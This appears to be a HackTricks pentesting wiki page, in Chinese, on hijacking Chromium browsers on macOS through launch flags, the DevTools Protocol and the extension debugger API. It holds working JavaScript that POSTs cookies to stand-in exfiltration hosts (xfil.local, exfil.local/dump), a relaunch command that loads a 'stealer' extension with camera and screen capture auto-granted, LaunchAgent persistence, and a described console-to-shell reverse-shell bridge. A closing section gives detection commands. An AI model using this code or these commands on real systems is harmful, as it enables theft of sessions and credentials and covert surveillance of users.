# macOS Chromium Injection

{{#include ../../../banners/hacktricks-training.md}}

## 基本信息

基于 Chromium 的浏览器，如 Google Chrome、Microsoft Edge、Brave、Arc、Vivaldi 和 Opera，都使用相同的命令行开关、偏好设置文件和 DevTools 自动化接口。在 macOS 上，任何拥有 GUI 访问权限的用户都可以终止现有浏览器会话，并使用任意 flags、扩展或 DevTools endpoints 重新打开浏览器，而这些内容会以目标用户的 entitlements 运行。

#### 在 macOS 上使用自定义 flags 启动 Chromium

macOS 会为每个 Chromium profile 保持单一 UI 实例，因此 instrumentation 通常需要强制关闭浏览器（例如使用 `osascript -e 'tell application "Google Chrome" to quit'`）。攻击者通常通过 `open -na "Google Chrome" --args <flags>` 重新启动浏览器，从而可以注入参数，而无需修改 app bundle。将该命令封装到用户 LaunchAgent（`~/Library/LaunchAgents/*.plist`）或 login hook 中，可以确保被篡改的浏览器在重启或注销后重新生成。

#### `--load-extension` Flag

`--load-extension` flag 会自动加载未打包的扩展（以逗号分隔的路径）。将其与 `--disable-extensions-except` 配合使用，可以阻止合法扩展，同时强制仅运行你的 payload。恶意扩展可以请求 `debugger`、`webRequest` 和 `cookies` 等高影响权限，以便转向 DevTools 协议、修改 CSP headers、降低 HTTPS 安全级别，或在浏览器启动后立即 exfiltrate session material。<sup>[[4]](#references)</sup>

#### `--remote-debugging-port` / `--remote-debugging-pipe` Flags

这些开关通过 TCP 或 pipe 暴露 Chrome DevTools Protocol（CDP），使外部工具能够驱动浏览器。Google 观察到该接口被 infostealer 广泛滥用，因此从 Chrome 136（2025 年 3 月）开始，除非浏览器使用非标准的 `--user-data-dir` 启动，否则这些开关会对默认 profile 被忽略。这会在真实 profiles 上强制启用 App-Bound Encryption，但攻击者仍然可以生成一个新 profile，诱使受害者在其中完成认证（通过 phishing/triage assistance），并通过 CDP 获取 cookies、tokens、device trust states 或 WebAuthn registrations。<sup>[[5]](#references)</sup>

#### `--user-data-dir` Flag

该 flag 会将整个浏览器 profile（History、Cookies、Login Data、Preference files 等）重定向到攻击者控制的路径。将现代 Chrome builds 与 `--remote-debugging-port` 结合使用时，这是必需的；它还可以隔离被篡改的 profile，使你能够放置预先填充的 `Preferences` 或 `Secure Preferences` 文件，以禁用安全提示、自动安装扩展并更改默认 schemes。

#### `--use-fake-ui-for-media-stream` Flag

该开关会绕过 camera/mic permission prompt，使任何调用 `getUserMedia` 的页面立即获得访问权限。将其与 `--auto-select-desktop-capture-source="Entire Screen"`、`--kiosk` 等 flags，或 CDP `Browser.grantPermissions` commands 结合，可以在无需用户交互的情况下静默捕获 audio/video、共享桌面，或满足 WebRTC permission checks。<sup>[[4]](#references)</sup>

## 实际攻击中常见的 Delivery & Relaunch Patterns

CDP abuse 通常属于 **post-exploitation** 阶段，而不是初始 payload。近期一场针对 macOS developers 的 campaign 使用了被投毒的 Xcode **`Run Script` build phase**（`PBXShellScriptBuildPhase`），使代码仅在受害者**构建**项目时执行，而不是仅仅 clone 或打开项目时执行。首次执行后，malware 还会感染其他 `.xcodeproj` trees、添加恶意 Git `pre-commit` hooks，并在 ZIP archives 中搜索更多 Xcode projects。<sup>[[3]](#references)</sup>

对于 Chromium abuse 而言，这一点很重要，因为攻击者不需要直接 patch browser binary。一个短期运行的 build-phase / `osascript` stager 可以改为安装一个 **browser wrapper**（LaunchAgent、login item、Dock entry、trojanized app launcher 等），每当用户启动合法浏览器时，就使用攻击者控制的 flags 重新打开它。<sup>[[3]](#references)</sup>

> [!TIP]
> 在 developer endpoints 上，检查 `.pbxproj` files、`.git/hooks/pre-commit` 和包含 `.xcodeproj` 的 ZIPs，查找异常的 `curl`、`osascript`、`xxd`、嵌套 `base64` 或 Chrome relaunch logic。

## Remote Debugging & DevTools Protocol Abuse

一旦 Chrome 使用专用的 `--user-data-dir` 和 `--remote-debugging-port` 重新启动，就可以通过 CDP（例如使用 `chrome-remote-interface`、`puppeteer` 或 `playwright`）连接，并编写高权限 workflows：

- **Cookie/session theft：**`Network.getAllCookies` 和 `Storage.getCookies` 会返回 HttpOnly values，即使 App-Bound encryption 通常会阻止 filesystem access；这是因为 CDP 会要求正在运行的 browser 对其进行解密。
- **Permission tampering：**`Browser.grantPermissions` 和 `Emulation.setGeolocationOverride` 允许绕过 camera/mic prompts（尤其是在与 `--use-fake-ui-for-media-stream` 结合时），或伪造基于 location 的 security checks。
- **Keystroke/script injection：**`Runtime.evaluate` 会在 active tab 中执行任意 JavaScript，从而实现 credential lifting、DOM patching，或注入可在 navigation 后继续存在的 persistence beacons。<sup>[[1]](#references)</sup>
- **Live exfiltration：**`Network.webRequestWillBeSentExtraInfo` 和 `Fetch.enable` 可以实时拦截 authenticated requests/responses，而无需接触磁盘 artifacts。
```javascript
import CDP from 'chrome-remote-interface';

(async () => {
const client = await CDP({host: '127.0.0.1', port: 9222});
const {Network, Runtime} = client;
await Network.enable();
const {cookies} = await Network.getAllCookies();
console.log(cookies.map(c => `${c.domain}:${c.name}`));
await Runtime.evaluate({expression: "fetch('https://xfil.local', {method:'POST', body:document.cookie})"});
await client.close();
})();
```
因为 Chrome 136 会在默认 profile 上阻止 CDP，将受害者现有的 `~/Library/Application Support/Google/Chrome` 目录复制到 staging 路径不再能够获得解密后的 cookies。相反，可以通过 social-engineer 诱导用户在 instrumented profile 中完成 authentication（例如通过“热心”的 support session），或者通过 CDP-controlled network hooks 在传输过程中捕获 MFA tokens。<sup>[[5]](#references)</sup>

### XCSSET-style CDP Backdoor Chain

一种实际的 malware pattern 是：

1. 每次 Chrome 启动时，重启 userland implant 或 wrapper。
2. 使用 `--remote-debugging-port=<port>` 启动 legitimate browser；在 Chrome 136 及更高版本中，通常还要配合非默认的 `--user-data-dir=<dir>`。
3. 启动一个 helper，连接本地 CDP WebSocket，并使用 `Page.addScriptToEvaluateOnNewDocument` 注册 pre-document hook。<sup>[[2]](#references)</sup>

该 helper 可以在 site code 运行**之前**注入 JavaScript，非常适合 hook `window.fetch`、`XMLHttpRequest`、wallet providers 或 autofill flows，而无需修改磁盘上的文件。<sup>[[3]](#references)</sup>
```javascript
await Page.enable();
await Runtime.enable();
await Page.addScriptToEvaluateOnNewDocument({
source: `
const oldFetch = window.fetch;
window.fetch = async (...args) => {
console.log('__HT__' + JSON.stringify(args[0]));
return oldFetch(...args);
};
`
});
Runtime.consoleAPICalled(({args}) => { /* helper parses __HT__ */ });
```
更强的变体会将 browser 变成一个 **host command bridge**：注入的 JavaScript 输出带有 delimiter 标记的 `console.log`，本地 helper 监听 `Runtime.consoleAPICalled`，移除 marker，通过 host shell 执行剩余内容（例如 Go 的 `exec.Command`），然后通过攻击者的 WebSocket 返回 stdout/stderr。这样便可将 tab-level script execution 升级为一种基本无文件的 reverse shell。<sup>[[3]](#references)</sup>

## 基于 Extension 的 Injection via Debugger API

2023 年的 "Chrowned by an Extension" research 证明，使用 `chrome.debugger` API 的 malicious extension 可以附加到任意 tab，并获得与 `--remote-debugging-port` 相同的 DevTools 权限。<sup>[[6]](#references)</sup>这打破了原有的隔离假设（extensions 保持在其自身 context 中），并支持：

- 使用 `Network.getAllCookies`/`Fetch.getResponseBody` 静默窃取 cookies 和 credentials。
- 修改 site permissions（camera、microphone、geolocation）并绕过 security interstitial，使 phishing pages 能够伪装 Chrome dialogs。
- 通过编程方式驱动 `Page.handleJavaScriptDialog`、`Page.setDownloadBehavior` 或 `Security.handleCertificateError`，篡改 TLS warnings、downloads 或 WebAuthn prompts。

使用 `--load-extension`/`--disable-extensions-except` 加载 extension，因此无需任何 user interaction。一个 weaponize 该 API 的最小 background script 如下：
```javascript
chrome.tabs.onUpdated.addListener((tabId, info) => {
if (info.status !== 'complete') return;
chrome.debugger.attach({tabId}, '1.3', () => {
chrome.debugger.sendCommand({tabId}, 'Network.enable');
chrome.debugger.sendCommand({tabId}, 'Network.getAllCookies', {}, (res) => {
fetch('https://exfil.local/dump', {method: 'POST', body: JSON.stringify(res.cookies)});
});
});
});
```
该 extension 还可以订阅 `Debugger.paused` events，以读取 JavaScript variables、patch inline scripts，或设置可跨 navigation 保留的 custom breakpoints。由于所有操作都在用户的 GUI session 内执行，不会触发 Gatekeeper 和 TCC，因此该 technique 非常适合已经在 user context 下获得执行权限的 malware。<sup>[[6]](#references)</sup>

## Detection & Hunting

- 对使用 `--remote-debugging-port`、`--remote-debugging-pipe` 或可疑 `--user-data-dir` 启动的 Chromium browsers 触发告警，尤其是其 parent 为 `bash`、`sh`、`osascript`、`xcodebuild` 或 LaunchAgent helper 时。
- 查找以下短链：helper 打开本地 CDP WebSocket，注册 `Page.addScriptToEvaluateOnNewDocument`，随后建立长连接 outbound WebSocket/HTTPS connection。
- 通过关联 browser 的 `Runtime.consoleAPICalled` activity 与执行 attacker-supplied commands 的 child shells 或 helper processes，hunt console-to-shell bridges。
- 在 developer Macs 上，检查 `.pbxproj` 中的 `PBXShellScriptBuildPhase` entries、Git `pre-commit` hooks、Dock/login item relaunchers，以及 ZIP-contained Xcode projects 中是否存在 browser wrapper installation。
```bash
ps auxww | rg 'Chrome|Brave|Edge.*(--remote-debugging-port|--remote-debugging-pipe|--user-data-dir)'
lsof -nP -iTCP -sTCP:LISTEN | rg 'Chrome|Brave|Edge'
find ~/Library/LaunchAgents /Library/LaunchAgents -name '*.plist' -exec plutil -p {} \; 2>/dev/null | rg 'remote-debugging|Google Chrome|Brave|Edge'
rg -n 'PBXShellScriptBuildPhase|curl|osascript|xxd|base64' ~/Code --glob '*.pbxproj'
```
### 工具

- [https://github.com/breakpointHQ/snoop](https://github.com/breakpointHQ/snoop) - 使用 payload extensions 自动启动 Chromium，并暴露交互式 CDP hooks。
- [https://github.com/breakpointHQ/VOODOO](https://github.com/breakpointHQ/VOODOO) - 类似的 tooling，专注于为 macOS operators 提供流量拦截和 browser instrumentation。
- [https://github.com/cyrus-and/chrome-remote-interface](https://github.com/cyrus-and/chrome-remote-interface) - Node.js library，用于在 `--remote-debugging-port` 实例运行后，通过脚本处理 Chrome DevTools Protocol dumps（cookies、DOM、permissions）。

### 示例
```bash
# Launch an instrumented Chrome profile listening on CDP and auto-granting media/capture access
osascript -e 'tell application "Google Chrome" to quit'
open -na "Google Chrome" --args \
--user-data-dir="$TMPDIR/chrome-privesc" \
--remote-debugging-port=9222 \
--load-extension="$PWD/stealer" \
--disable-extensions-except="$PWD/stealer" \
--use-fake-ui-for-media-stream \
--auto-select-desktop-capture-source="Entire Screen"

# Intercept traffic
voodoo intercept -b chrome
```
在 tools 链接中查找更多示例。

## 参考资料

- [1] [Chrome DevTools Protocol - Runtime domain](https://chromedevtools.github.io/devtools-protocol/v8/Runtime/)
- [2] [Chrome DevTools Protocol - Page domain](https://chromedevtools.github.io/devtools-protocol/tot/Page/)
- [3] [Xcode Assassin 回归：深入解析最新 XCSSET 版本 - Unit 42](https://unit42.paloaltonetworks.com/xcsset-v40-malware-analysis/)
- [4] [X 上的 Ron Masas (@RonMasas)](https://twitter.com/RonMasas/status/1758106347222995007)
- [5] [更改 remote debugging switches 以提升安全性 - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [6] [被 Extension Chrowned：通过 Debugger API 滥用 Chrome DevTools Protocol（arXiv:2305.11506）](https://arxiv.org/abs/2305.11506)

{{#include ../../../banners/hacktricks-training.md}}
